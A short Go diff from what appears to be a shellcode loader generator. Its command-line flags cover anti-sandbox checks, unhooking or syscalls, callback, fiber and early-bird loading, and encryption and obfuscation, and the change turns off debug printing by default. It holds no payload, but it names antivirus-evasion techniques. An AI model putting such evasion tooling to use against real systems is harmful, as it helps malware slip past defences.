@@ -27,7 +27,7 @@ func Options() *Others.FlagOptions {
 	sandbox := flag.Bool("sandbox", false, "是否开启反沙箱模式")
 	unhook := flag.Bool("unhook", false, "是否使用unhook模式(默认使用syscall)")
 	loadingTechnique := flag.String("loading", "callback", "请选择加载方式，支持callback,fiber,earlybird")
-	debug := flag.Bool("debug", true, "是否打印shellcode中间加密/混淆过程")
+	debug := flag.Bool("debug", false, "是否打印shellcode中间加密/混淆过程")
 	flag.Parse()
 
 	return &Others.FlagOptions{Help: *help, OutFile: *outFile, InputFile: *inputFile, Language: *language, Encryption: *encryption, KeyLength: *keyLength, Obfuscation: *obfuscation, Framework: *framework, Sandbox: *sandbox, Unhook: *unhook, Loading: *loadingTechnique, Debug: *debug}
